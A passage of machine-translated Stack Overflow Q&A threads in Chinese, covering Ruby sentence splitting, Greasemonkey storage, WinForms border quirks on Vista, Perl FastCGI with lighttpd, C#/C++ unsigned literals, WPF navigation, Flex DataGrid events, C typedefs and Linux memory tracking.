$string = "Mr. Thompson is from the U.S.A. and is 75 years old. Dr. Bob is a dentist. This is a string that contains several sentances. For example this is one. Followed by another. Can it deal with a question?  It sure can!";

my @sentances = split(/(?:(?<=\.|\!|\?)(?<!Mr\.|Dr\.)(?<!U\.S\.A\.)\s+(?=[A-Z]))/, $string);

for (@sentances) {
    print $_."\n";
} 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2016-12-27T02:48:34.843

同意接受的答案，使用斯坦福核心 NLP 是不费吹灰之力的。

[但是，在 2016 年， Stanford Parser](http://stanfordparser.rubyforge.org/)与更高版本的 stanford core nlp接口存在一些[不兼容](https://stackoverflow.com/questions/9456356/stanford-parser-in-ruby-does-not-create-preprocesser)问题（我遇到了[Stanford Core NLP v3.5](http://stanfordnlp.github.io/CoreNLP/history.html)的问题）。

**以下是我使用 Ruby 与 Stanford Core NLP 接口将文本解析为句子的方法**：

1.  安装[斯坦福 CoreNLP gem](https://github.com/louismullie/stanford-core-nlp)：

`gem install stanford-core-nlp`

2.  然后按照[使用最新版本的 Stanford CoreNLP 自述文件中](https://github.com/louismullie/stanford-core-nlp#using-the-latest-version-of-the-stanford-corenlp)的说明进行操作：

> 使用最新版本的斯坦福 CoreNLP（3.5.0 版截至 2014 年 10 月 31 日）需要一些额外的手动步骤：
> 
> *   从[http://nlp.stanford.edu/](http://nlp.stanford.edu/)下载[Stanford CoreNLP 3.5.0 版](http://nlp.stanford.edu/software/stanford-corenlp-full-2014-10-31.zip)。
>     
>     
> *   将提取的存档内容放在 stanford-core-nlp gem 的 /bin/ 文件夹中（例如 [...]/gems/stanford-core-nlp-0.x/bin/）或配置的目录位置通过设置 StanfordCoreNLP.jar_path。
>     
>     
> *   从[http://nlp.stanford.edu/](http://nlp.stanford.edu/)下载[完整的 Stanford Tagger 3.5.0 版](http://nlp.stanford.edu/software/stanford-postagger-full-2014-10-26.zip)。
>     
>     
> *   在 stanford-core-nlp gem 的 /bin/ 文件夹（例如 [...]/gems/stanford-core-nlp-0.x/bin/ ）或由设置 StanfordCoreNLP.jar_path。
>     
>     
> *   将提取的存档内容放在 taggers 目录中。
>     
>     
> *   从[https://github.com/louismullie/stanford-core-nlp](https://github.com/louismullie/stanford-core-nlp)下载[bridge.jar 文件](https://github.com/louismullie/stanford-core-nlp/blob/master/bin/bridge.jar?raw=true)。
>     
>     
> *   将下载的 bridger.jar 文件放在 stanford-core-nlp gem 的 /bin/ 文件夹中（例如 [...]/gems/stanford-core-nlp-0.x/bin/taggers/）或目录中通过设置 StanfordCoreNLP.jar_path 配置。

然后将文本拆分为句子的 ruby​​ 代码：

```
require "stanford-core-nlp"

#I downloaded the StanfordCoreNLP to a custom path:
StanfordCoreNLP.jar_path = "/home/josh/stanford-corenlp-full-2014-10-31/"

StanfordCoreNLP.use :english
StanfordCoreNLP.model_files = {}
StanfordCoreNLP.default_jars = [
  'joda-time.jar',
  'xom.jar',
  'stanford-corenlp-3.5.0.jar',
  'stanford-corenlp-3.5.0-models.jar',
  'jollyday.jar',
  'bridge.jar'
]

pipeline =  StanfordCoreNLP.load(:tokenize, :ssplit)

text = 'Mr. Josh Weir is writing some code. ' + 
  'I am Josh Weir Sr. my son may be Josh Weir Jr. etc. etc.'
text = StanfordCoreNLP::Annotation.new(text)
pipeline.annotate(text)
text.get(:sentences).each{|s| puts "sentence: " + s.to_s}

#output:
#sentence: Mr. Josh Weir is writing some code.
#sentence: I am Josh Weir Sr. my son may be Josh Weir Jr. etc. etc. 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-05-13T22:53:03.603

也许尝试将其拆分为句点，后跟一个空格，后跟一个大写字母？我不确定如何找到大写字母，但这将是我开始研究的模式。

**编辑：** [用 Ruby 查找大写字母。](http://blog.freelenzer.at/2007/11/ruby-get-uppercase-letters-from-string.html)

**另一个编辑：**

检查不以大写字母开头的单词后面的句子结尾标点符号。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2011-02-23T11:52:19.787

如果您正在考虑 JAVA（以及 Ruby 也很困难 ;)），Manning 博士的回答是最合适的。是这里-

> 有一个句子拆分器： edu.stanford.nlp.process.DocumentPreprocessor 。尝试命令：java edu.stanford.nlp.process.DocumentPreprocessor /u/nlp/data/lexparser/textDocument.txt
> 
> > oneTokenizedSentencePerLine.txt 。（这是通过（良好但启发式的）FSM 完成的，因此速度很快；您没有运行概率解析器。）

但是如果我们修改命令 java edu.stanford.nlp.process.DocumentPreprocessor /u/nlp/data/lexparser/textDocument.txt > oneTokenizedSentencePerLine.txt TO **java edu.stanford.nlp.process.DocumentPreprocessor *-file* /u有一点建议/nlp/data/lexparser/textDocument.txt > oneTokenizedSentencePerLine.txt**。它可以正常工作，因为您需要指定作为输入呈现的文件类型。所以 -file 用于文本文件，-html 用于 HTML 等。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2013-02-12T23:48:13.957

我没有尝试过，但如果英语是您唯一关心的语言，我建议您看看[Lingua::EN::Readability](http://www.pressure.to/ruby/)。

> Lingua::EN::Readability 是一个 Ruby 模块，用于计算英文文本的统计信息。它可以提供单词、句子和音节的计数。它还可以计算几个可读性度量，例如雾指数和 Flesch-Kincaid 级别。该软件包包括模块Lingua::EN::Sentence，它将英文文本分解为注意缩写的句子，以及Lingua::EN::Syllable，它可以猜测书面英语单词的音节数。如果有发音词典，它可以查找词典中的音节数以获得更高的准确性

你想要的位`sentence.rb`如下：

```
module Lingua
module EN
# The module Lingua::EN::Sentence takes English text, and attempts to split it
# up into sentences, respecting abbreviations.

module Sentence
  EOS = "\001" # temporary end of sentence marker

  Titles   = [ 'jr', 'mr', 'mrs', 'ms', 'dr', 'prof', 'sr', 'sen', 'rep', 
         'rev', 'gov', 'atty', 'supt', 'det', 'rev', 'col','gen', 'lt', 
         'cmdr', 'adm', 'capt', 'sgt', 'cpl', 'maj' ]

  Entities = [ 'dept', 'univ', 'uni', 'assn', 'bros', 'inc', 'ltd', 'co', 
         'corp', 'plc' ]

  Months   = [ 'jan', 'feb', 'mar', 'apr', 'may', 'jun', 'jul', 
         'aug', 'sep', 'oct', 'nov', 'dec', 'sept' ]

  Days     = [ 'mon', 'tue', 'wed', 'thu', 'fri', 'sat', 'sun' ]

  Misc     = [ 'vs', 'etc', 'no', 'esp', 'cf' ]

  Streets  = [ 'ave', 'bld', 'blvd', 'cl', 'ct', 'cres', 'dr', 'rd', 'st' ]

  @@abbreviations = Titles + Entities + Months + Days + Streets + Misc

  # Split the passed text into individual sentences, trim these and return
  # as an array. A sentence is marked by one of the punctuation marks ".", "?"
  # or "!" followed by whitespace. Sequences of full stops (such as an
  # ellipsis marker "..." and stops after a known abbreviation are ignored.
  def Sentence.sentences(text)

    text = text.dup

    # initial split after punctuation - have to preserve trailing whitespace
    # for the ellipsis correction next
    # would be nicer to use look-behind and look-ahead assertions to skip
    # ellipsis marks, but Ruby doesn't support look-behind
    text.gsub!( /([\.?!](?:\"|\'|\)|\]|\})?)(\s+)/ ) { $1 << EOS << $2 }

    # correct ellipsis marks and rows of stops
    text.gsub!( /(\.\.\.*)#{EOS}/ ) { $1 }

    # correct abbreviations
    # TODO - precompile this regex?
    text.gsub!( /(#{@@abbreviations.join("|")})\.#{EOS}/i ) { $1 << '.' }

    # split on EOS marker, strip gets rid of trailing whitespace
    text.split(EOS).map { | sentence | sentence.strip }
  end

  # add a list of abbreviations to the list that's used to detect false
  # sentence ends. Return the current list of abbreviations in use.
  def Sentence.abbreviation(*abbreviations)
    @@abbreviations += abbreviations
    @@abbreviations
  end
end
end
end 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-05-13T22:53:02.027

我不是一个 Ruby 人，而是一个分裂的 RegEx

```
 ^(Mr|Mrs|Ms|Mme|Sta|Sr|Sra|Dr|U\.S\.A)[\.\!\?\"] [A-Z] 
```

将是我最好的选择，一旦你得到了段落（在 \r\n 上分割）。这假设您的句子大小写正确。

显然这是一个相当丑陋的正则表达式。如何在句子之间强制两个空格

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-05-13T22:53:18.000

在句点后面加上一个空格和一个大写字母不会适用于“布朗先生”这样的标题。

句号使事情变得困难，但一个容易处理的情况是感叹号和问号。但是，有些情况会使这不起作用。即雅虎的公司名称！

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2009-05-13T22:57:41.457

好吧显然`paragraph.split('.')`不会削减它

`#split`将采用正则表达式作为答案，因此您可以尝试使用零宽度的lookbehind 来检查以大写字母开头的单词。当然，这会在专有名词上分裂，因此您可能不得不求助于这样的正则表达式`/(Mr\.|Mrs\.|U\.S\.A ...)`，除非您以编程方式构建正则表达式，否则这将非常难看。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2009-05-13T22:59:35.307

我认为这并不总是可解决的，但您可以根据“。”（后面的句号和空格）进行拆分，并验证句点之前的单词不在 Mr、Dr 等单词列表中。

但是，当然，您的列表可能会遗漏一些单词，在这种情况下，您会得到不好的结果。

# jquery - Greasemonkey + jQuery：在事件回调中使用 GM_setValue()

> ID：860829
> 
> 赞同：3
> 
> 时间：2009-05-13T22:54:59.137
> 
> 标签：jquery, events, callback, greasemonkey, storage

我正在尝试在 GreaseMonkey 脚本中将数据设置为长期存储，但 GM_setValue() 似乎静默失败：

```
$("a#linkid").click(function()
{
    GM_setValue("foo", 123); // doesn't work, but does not generate error
});

GM_setValue("bar", 123); // works properly, value is set 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-05-14T00:25:48.990

我认为这是一个特定的 Greasemonkey 安全问题。请参阅[0.7.20080121.0 兼容性](http://wiki.greasespot.net/0.7.20080121.0_compatibility)。GM 不允许用户页面调用 GreaseMonkey API，这就是您在那里所做的（您正在使用在用户上下文中运行的 JQuery 注册一个单击处理程序）。该页面上还提供了一种解决方法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-02-18T07:21:49.843

我有同样的问题......

以前的解决方案对我不起作用，我找到了这样的解决方案......

```
function gmGet(name) {
    var theValue = GM_getValue(name);
    return theValue;
}

function gmSet(name, valuee) {
    GM_setValue(name, valuee);
}

$("a#linkid").click(function(){
    //setValue
    gmSet("foo", 123);

   //getValue
   gmGet("foo");
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-07-21T02:48:38.873

您可以使用此解决方案。

```
$("a#linkid").click(function()
{
    //setValue
    setTimeout(GM_setValue("foo", 123),0);

   //getValue
   setTimeout(GM_getValue("foo"),0);
}); 
```

# c# - Vista中固定表单边框样式的奇怪问题

> ID：860846
> 
> 赞同：0
> 
> 时间：2009-05-13T23:01:27.783
> 
> 标签：c#, .net, forms, coding-style, border

我之前关于这个问题的帖子没有得到太多答案，而且有点具体且难以理解。我想我已经设法更好地理解了这个问题，我现在认为这是一个 Vista 问题......

问题在于所有类型的固定边框样式，例如 FixedDialog、Fixed3D、FixedSingle 和 FixedToolWindow。它不会发生在相当大的人身上。这个问题，就像我说的，它也只发生在 Vista 上。

假设您有一个具有任何固定边框样式的表单，并将起始位置设置为 0,0。您在这里想要的是将表单捕捉到屏幕的左上角。如果表单边框样式是相当大的选项之一，这很好用，如果它是固定的，那么表单将在左侧和顶部的屏幕工作区域之外一点点。

更奇怪的是，表单位置并没有改变，仍然是 0,0，但是表单的几个像素仍然绘制在工作屏幕区域之外。

我在 XP 上对此进行了测试，但没有发生，问题是 Vista 特有的。在 XP 上，唯一的区别是任何样式之间的边框大小都会发生一些变化。但表格总是完美地捕捉到位置 0,0。

如果可能，如果**没有**找到在工作区域之外绘制了多少像素然后将其添加到表单位置，是否有可能的方法来解决或解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-21T23:27:11.390

如果启用了 Aero，Windows 会在窗口大小和位置方面对您撒谎`Fixed*` `FormBorderStyle`。以下代码显示了如何获取此类 Window 的正确高度和顶部偏移。类似的技术将允许您在 (0,0) 处放置一个窗口。

```
[DllImport("dwmapi.dll", PreserveSig = false)]
public static extern bool DwmIsCompositionEnabled();

// When Aero is enabled, and our FormBorderStyle is FixedToolWindow,
//    Windows will lie to us about our size and position.
public bool AeroIsMessingWithUs()
{
    bool ret = false;
    try
    {
        // check for other Fixed styles here if needed
        if (FormBorderStyle == System.Windows.Forms.FormBorderStyle.FixedToolWindow)
        {
            if (Environment.OSVersion.Version.Major >= 6 && DwmIsCompositionEnabled())
            {
                // Aero is enabled
                ret = true;
            }
        }
    }
    catch
    {
    }
    return ret;
}

public int MyWindowHeight()
{
    int height = Height;
    if (AeroIsMessingWithUs())
    {
        // there are actually 5 more pixels on the top and bottom
        height += 10;
    }
    return height;
}

public int MyWindowY()
{
    int y = Location.Y;
    if (AeroIsMessingWithUs())
    {
        // I'm actually 5 pixels higher than Windows says I am
        y -= 5;
    }
    return y;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-14T23:34:43.820

我想这样做的原因是允许我应用了皮肤的应用程序启用或禁用该皮肤。整个应用程序在皮肤上运行良好，我试图实现一个属性来启用和禁用皮肤。这个主题的问题是我在禁用皮肤时遇到的问题之一。然后我意识到，如果皮肤被禁用，我还有很多其他烦人的问题需要处理。这意味着我现在会忘记这个功能，暂时让皮肤保持打开状态。我只是现在没有时间处理这么多问题......

提议结束这个问题...

# controls - SWT 减少选项卡控件的闪烁

> ID：860855
> 
> 赞同：1
> 
> 时间：2009-05-13T23:04:57.373
> 
> 标签：controls, swt, tabs

当我在 SWT 中切换选项卡时，选项卡中的内容会闪烁。这不会发生在我的 Swing 版本中，并且困扰着我和我的客户。我能做些什么来减少这种闪烁？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-14T02:24:55.883

我的团队发现过度闪烁有时可能是由于对 redraw() 或 layout() 的调用过多。尝试找到它们，并删除不必要的。

如果您正在做一些图形密集型的事情并且不关心图形直到最后更新，您也可以暂时关闭重绘。我们使用应用程序中的一些复杂图形和图表来做到这一点；只要最后绘制了所有数据，就无需在设置信息时进行干预重绘。

[http://help.eclipse.org/help32/index.jsp?topic=/org.eclipse.platform.doc.isv/reference/api/org/eclipse/swt/widgets/Control.html](http://help.eclipse.org/help32/index.jsp?topic=/org.eclipse.platform.doc.isv/reference/api/org/eclipse/swt/widgets/Control.html)

例如，控件有一个可以使用的 setRedraw(boolean) 方法。

# perl - 尝试使用 fast-cgi 和 lighttpd 运行 perl 脚本，但文件只是下载

> ID：860860
> 
> 赞同：3
> 
> 时间：2009-05-13T23:08:36.680
> 
> 标签：perl, fastcgi, lighttpd

问题是我的 .pl 脚本被下载为空白文件，而不是被执行。

我读到：[http ://redmine.lighttpd.net/wiki/lighttpd/ApplicationsUsingLighttpd](http://redmine.lighttpd.net/wiki/lighttpd/ApplicationsUsingLighttpd)

我的 dispatch.fcgi 如下：（它位于 usr/bin/

```
#!perl
#!/usr/bin/perl
use strict;
use CGI::Fast;
use Embed::Persistent; {
my $p = Embed::Persistent->new();
while (new CGI::Fast) {
my $filename = $ENV{SCRIPT_FILENAME};
my $package = $p->valid_package_name($filename);
my $mtime;
if ($p->cached($filename, $package, \$mtime)) {
eval {$package->handler;};
}
else {
$p->eval_file($ENV{SCRIPT_FILENAME});
}
}
} 
```

这是我的 lighttpd 配置文件中的代码：

```
".pl" =>
((
"fastcgi.debug" => 1,
"bin-path" => "/usr/bin/dispatch.fcgi",
"socket" => "/tmp/fcgi.socket",
"check-local" => "disable",
"min-procs" => 1,
"max-procs" => 5,
"idle-timeout" => 20
)) 
```

我必须安装 CGI.pm 并嵌入 cpan 模块。现在我的服务器日志中没有任何错误，但正如我所说，脚本只是下载。

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-19T04:44:13.257

让 carp 写入文件并在那里查找问题。

```
BEGIN {
use CGI::Carp qw/carpout/;
open LOG, ">>", "carp.log" or die("Cannot open file: $!\n");
carpout(LOG);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-14T22:27:35.667

您似乎没有发送正确的标头。使用 CGI 模块中的“header”函数发出标头

```
$cgi = new CGI;
$cgi->header(); 
```

那么你应该很高兴。

有关更多信息，请查看标头文档：

[http://cpansearch.perl.org/src/LDS/CGI.pm-3.43/cgi_docs.html#header](http://cpansearch.perl.org/src/LDS/CGI.pm-3.43/cgi_docs.html#header)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-01-07T05:41:07.877

确保为扩展设置了静态排除。就像是...

static-file.exclude-extensions = ( ".php", ".pl" )

或者它只会像其他任何文件一样下载文件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-15T15:55:21.200

谢谢！

```
#!/usr/bin/perl -w
use strict;
my $cgi = new CGI;
print $cgi->header();
print 'Hello world.'; 
```

作品！但是，我想知道为什么我需要打印标题以使其与 fastcgi 和 lighttpd 一起使用。我有一个其他人编写的大型脚本，可以在我的 apache 和常规 cgi 服务器上运行。我想我必须修改它才能在我的新服务器上工作。

问题是我认为打印标题可能会弄乱脚本，因为它执行的操作类似于打印执行的 html。

再次感谢

# c# - 为什么编译器不喜欢隐式转换为 uint？

> ID：860863
> 
> 赞同：3
> 
> 时间：2009-05-13T23:09:47.227
> 
> 标签：c#, c++, visual-c++, gcc

我在 C++ 和 C# 中遇到了一些关于 uint 使用的类似怪癖，现在我想知道其中的原因（每个示例可能完全不同）。对于这两个示例，请注意我正在编译时将警告级别设置为最大值。

(1) gcc 在下面抱怨将 int 与 uint 进行比较，而 vc++ 则没有：

```
uint foo = <somevalue>;
if( foo == ~0 )  //right here
   ... 
```

在 gcc 和 vc++ 上没有任何强制转换，与 0 进行比较就可以了。

(2) 在 C# 3.5 中，我遇到了一个类似的问题。以下工作正常：

```
uint foo = 1;
uint bar = 2; 
```

但这给出了一个 uint/int 警告：

```
bool condition = <somevalue>;
uint foo = condition ? 1 : 2; //right here 
```

什么给出了，为什么编译器对立即值的符号性如此敏感？我完全理解从变量赋值时的问题，但这对我来说对于立即值没有意义；解析中是否有一些隐藏的困难阻止了这种行为？要不然是啥？

**编辑：**是的，我知道我可以用'u'作为我的数字后缀，但这回避了我的问题，即*隐式*转换到左侧，而不是显式转换到右侧。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-05-13T23:23:14.583

在没有明确程序员意图的情况下混合有符号和无符号值可能会导致细微的错误。确实，int 和 uint 都存储在相同大小（4 字节）的内存位置中，并且位置分配兼容，但是它们在常见操作方面的位表示和行为是不同的，并且它们也有不同的范围。

这就像解决一个数学问题并说为什么我不能将 [-2147483648 到 2147483647] 区间与 [0 到 4294967295] 区间自由交换？好吧，您可以，但是如果您超出范围，结果可能不是正确的:)。这就是为什么编译器要求您确认（通过明确），您不会错误地混合不同的类型。

同样在 C# 文字中，数字始终是 int32，如果您想要一些其他文字类型，如 float、decimal、ulong 等，您需要使用适当的后缀，在您的情况下：

```
uint foo = condition ? 1u : 2u; // uint literals; 
```

编辑：正如 Andrew Hare 所指出的，C# 整数文字不仅仅是 int32，而是 (int, uint, long, ulong) 取决于大小，如下所述：

[C# Inger 文字 - MSDN](http://msdn.microsoft.com/en-us/library/aa664674(VS.71).aspx)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-05-13T23:17:56.853

我不能说，`gcc`但至于 C# 3 编译器，你需要明确告诉它这些`ints`应该是无符号的：

```
uint foo = condition ? 1U : 2U; 
```

C# 编译器**喜欢** `ints`并假定范围内的所有整数值都是`ints`. 由于您的表达式使用条件运算符，编译器太急于假设您的文字值是`ints`，然后赋值失败。

* * *

**编辑：**请注意，我说的是*在 a 范围内*的*整数值*。考虑这个例子：*`System.Int32`*

 *```
using System;    

class Program    
{    
    static void Main()    
    {    
        Console.WriteLine(1.GetType());    
        Console.WriteLine(2147483648.GetType());    
    }    
} 
```

**输出：**

> `System.Int32`
> `System.UInt32`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-13T23:23:12.883

让我问你一个问题……假设你有一个大端、32 位机器，它代表 2 的补码中的数字。什么无符号整数值等于 0xFFFFFFFF 的有符号整数值？好吧，如果你看到有人这样做，你不会警告吗？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-13T23:18:41.050

默认情况下，当您键入 0、1 或任何数字时，它被视为 int。由于显而易见的原因，比较 int 和 uint 是不安全的，如果你的 int 小于 0 怎么办。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-13T23:25:10.943

为变量赋值时，C# 编译器会在编译时进行自然隐式转换。但是，只有当它有足够的上下文来推断所需的数据类型时，它才能应用转换。例如：

```
uint foo = 1; 
```

...有效，因为该值`1`已分配给已知类型的变量。然而

```
uint foo = condition ? 1 : 2; 
```

不起作用，因为无法推断数据类型。在解析源代码时，编译器会相互比较 1 和 2 以确保它们属于同一类型。它不能从后面的赋值中推断出来，因为它是一个单独的表达式。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-13T23:27:41.923

至于您的 C++ 问题，默认情况下，文字`0`是带符号的`int`. 该表达式`~0`产生`-1`(all bits on) 的二进制补码表示。因此，编译器似乎在抱怨您正在尝试将 a 与 进行`unsigned int`比较`-1`。

也就是说，我无法在 g++ 4.0 或 4.2 上重现您的错误。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-05-14T00:32:15.093

就实际答案而言，我支持 Pop Catalin。

如果可以的话，我想补充一下，在 C++ 中引入的 static_cast<> 运算符会生成一个二进制文件，就像类型说明符生成的二进制文件一样。即尝试比较和对比用法：

```
int abc = 123;
uint i = static_cast<unit>(abc); // C++ explicit cast
uint ii = 123U; // specifier
uint j = (uint)abc; // C-style cast 
```

我喜欢显式强制转换，因为当您回到代码中寻找细微的强制转换错误时，它会有所帮助。

# wpf - 如何在导航 wpf 应用程序中保持页面完整状态

> ID：860866
> 
> 赞同：4
> 
> 时间：2009-05-13T23:10:26.617
> 
> 标签：wpf, navigationservice

我正在使用页面和导航服务构建 WPF 应用程序。
其中一个页面将对象作为构造函数

```
Sub New(ByVal o As Object)
    ' This call is required by the Windows Form Designer.
    InitializeComponent()

    .... 
```

所以，导航到它我做

```
 Dim MyPage As New Page1(MyObject)
    MyBase.NavigationService.Navigate(MyPage) 
```

当我在页面中编辑某些内容并返回并转发到 MyPage 时出现问题，我收到以下错误：

```
 Cannot create object of type 'Page1'. CreateInstance failed, which can be 
 caused by not having a public default constructor for 'Page1'. 
```

**我究竟做错了什么？**

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-05-13T23:20:14.773

您需要告诉主机应用程序该页面应该保留在内存中，而不是每次您离开时都“卸载”并在您返回时“重新加载”。事实证明这很容易：只需将[KeepAlive](http://msdn.microsoft.com/en-us/library/system.windows.controls.page.keepalive.aspx)属性添加到您的页面声明中：

```
<Page x:Class="..." KeepAlive="True"> 
```

有趣的是，MSDN 文档是这样说的：

> 仅使用代码实例化和导航到的页面（例如，调用 Navigate）会自动保持活动状态。

我还没有发现这种情况，从你的问题来看，你似乎也没有这样发现。

# wpf - WPF - DataTemplate 中 MenuItem 中的命令

> ID：860868
> 
> 赞同：-2
> 
> 时间：2009-05-13T23:11:24.070
> 
> 标签：wpf, datatemplate, command, menuitem

我有一个包含图像的 DataTemplate。我在图像中添加了一个带有 MenuItem 的 ContextMenu。我与 MenuItem 关联了一个命令。然后我使用 DataTemplate 处理视图中的命令。

在 CanExecute 处理程序中，我有 e.CanExecute = true。但是 Executed 处理程序永远不会被执行。如果我删除了 MenuItem 的命令分配，当我右键单击图像时，菜单会正确显示。

我究竟做错了什么？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-05-13T23:36:48.163

我想通了 - 在 e.CanExecute = true; 之后 我有一个 MessageBox.Show，这阻止了 Executed 被调用。我不知道为什么。

# apache-flex - 响应行中的 ItemClick 事件，而不是标题

> ID：860870
> 
> 赞同：0
> 
> 时间：2009-05-13T23:12:12.883
> 
> 标签：apache-flex, datagrid, flex3

我有一个响应 itemClick 事件的功能数据网格。一切正常，除了它还会在单击标题时触发 itemClick 事件。因此，它们不会对网格数据进行排序，而是触发改变状态的事件。我只想让点击事件响应被点击的行，而不是标题。

我到处搜索并翻阅我的书，我看到的每个例子似乎都有效，所以我想知道我在这里做错了什么：

```
<mx:Script>
        <![CDATA[

            [Bindable]
            public var acPrograms:ArrayCollection;

            private function showGameDetail(event:ListEvent):void {
                var programEvent:ProgramsEvent = new ProgramsEvent(ProgramsEvent.SHOW_DETAIL);
                programEvent.selectedProgram = TvPrograms( event.currentTarget.selectedItem );
                dispatchEvent(programEvent);

                currentState = "details";
            }   

        ]]>
    </mx:Script>        
    <mx:DataGrid id="gamesGrid" height="270" dataProvider="{acPrograms}"
            itemClick="showGameDetail(event);">
            <mx:columns>
                <mx:DataGridColumn headerText="Date" dataField="dateOutput" width="90" />
                <mx:DataGridColumn headerText="Time" dataField="startTime" width="70" />
                <mx:DataGridColumn headerText="Title" dataField="subTitle" width="360" />
                <mx:DataGridColumn headerText="Channel" dataField="channel" width="80" />
                <mx:DataGridColumn headerText="Provider" dataField="provider" width="100" />
            </mx:columns>
        </mx:DataGrid> 
```

编辑：

这里真正的问题是我的缓存设置。我正在使用具有单击事件而不是 itemClick 的缓存版本。所以 click 事件会响应网格上的所有点击，并且 itemClick 会根据需要执行，我需要做的就是关闭我的缓存。就我而言，Bonehead，但感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-13T23:21:53.897

如何在您的事件处理程序中添加以下内容？

```
if (event.rowIndex < 0) 
  return; 
```

# c++ - 在内置类型上使用 typedefs（或#defines） - 任何合理的理由？

> ID：860877
> 
> 赞同：2
> 
> 时间：2009-05-13T23:14:15.113
> 
> 标签：c++, c, coding-style

好吧，我正在做一些 Java-C 集成，并使用了 C 库中的类型映射（还有更多；））：

```
#define CHAR        char                    /*  8 bit signed int            */
#define SHORT       short                   /* 16 bit signed int            */
#define INT         int                     /* "natural" length signed int  */
#define LONG        long                    /* 32 bit signed int            */
typedef unsigned    char    BYTE;           /*  8 bit unsigned int          */
typedef unsigned    char    UCHAR;          /*  8 bit unsigned int          */
typedef unsigned    short   USHORT;         /* 16 bit unsigned int          */
typedef unsigned    int     UINT;           /* "natural" length unsigned int*/ 
```

有什么正当理由不使用它们吗？它不会`char`很快被重新定义。

我能想到：

1.  编写平台/编译器可移植代码（C/C++ 中未指定类型大小）
2.  节省嵌入式系统的空间和时间——如果你在 8 位微处理器上循环小于 255 的数组：

    ```
     for(uint8_t ii = 0; ii < len; ii++) 
    ```

    将提供可衡量的加速。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-13T23:16:39.350

这正是原因。C 在许多系统中使用，它实际上相当令人不安的是类型大小在平台/硬件/版本之间实际发生变化的频率。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-13T23:48:21.373

C 标准没有指定整数类型的大小。它取决于编译器以及代码将在其上运行的处理器。

因此，为了获得最大的可移植性，最好有一个使用标准名称的标头，以指示每种类型对于该特定目标的大小。

MISRA-C 和其他使用 uint16_t、sint32_t 等。更短的形式，例如 u16、s32 也在使用中。

关于#define v typedef：使用typedef，强制编译器进行类型检查。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-13T23:26:00.227

正如你所说，还有更多.. 其中一些必须像 INT32 和 INT64

int 默认没有标准大小。允许为 32 位或 64 位。

因此，像上面这样的声明有助于编写可移植代码，您可以在其中安全地假设 INT32 将始终给我 32 位 int。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-13T23:43:33.207

问：使用 typedefs 或 #defines？

答：嗯，定义是预处理器指令，但 typedef 实际上是编译器执行的工作。就个人而言，我更喜欢将 typedef 用于类型定义，并为常量和函数包装器等进行定义。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-13T23:28:45.213

不仅为了跨操作系统的可移植性，而且为了跨架构的可移植性，例如在 32 位和 64 位机器之间。

想象一下，您在一台 32 位机器上编写了一些网络代码，该机器使用两个无符号整数来存储 64 个连续位标志。在 64 位机器上编译相同的代码，它实际上可以保证不起作用，因为大多数 64 位机器为一个 int 分配 8 个字节，所以你最终会分配 128 位和 32 位之间的间隙两组 32 位标志。这显然对便携性非常不利。

在 *nix 机器上，很多时候你会看到 typedef 专门指代为该变量分配的内存大小，例如 uint16_t 和 uint32_t。然后将这些类型定义为在特定架构上为您提供那么多未签名存储的任何类型，因此您的代码可以在操作系统和架构之间保持一致。

# linux - 跟踪 Linux 程序中活跃使用的内存

> ID：860878
> 
> 赞同：6
> 
> 时间：2009-05-13T23:14:51.117
> 
> 标签：linux, memory, profiling

我想跟踪在特定状态下各种程序接触了多少内存。例如，假设我有一个图形程序。当它被最小化时，它可能会使用更少的内存，因为它不会重绘窗口，这需要读取图像和字体并执行大量的库函数。这些对象仍然可以在内存中访问，但它们实际上并没有被使用。

像这样的工具`top`用途有限，因为它们只是告诉有多少内存映射到程序的地址空间，以及有多少内存驻留在物理 RAM 中。同样，泄漏检测器只会告诉内存何时不可访问，而不是如果它没有被使用。

是否有现有的工具可以以这种方式跟踪积极使用/未使用的内存？如果可能的话，我不仅想跟踪堆上的使用情况，还想跟踪存储程序/库代码的内存中的使用情况。

* * *

**编辑：**我想澄清一下：我想知道程序在某个点之后实际读取、写入或执行的内存量，即，一旦它达到某个状态。虽然地址空间中的页数和常驻页数是重要的衡量标准，但这不是我想要的。

我现在正在追求三种方法：

1.  我编写了一个库，它使用 `mprotect` 清除从 /proc/self/maps 读取的所有内存区域（堆栈及其自己的代码除外）的保护位。它有一个段错误处理程序，可以恢复保护位并增加一个计数器。我用`LD_PRELOAD`加载它，它在收到信号时开始跟踪内存访问。这产生了一些看似虚假地址的真正故障（在故障发生时它们没有存储在任何寄存器或附近的内存中）。
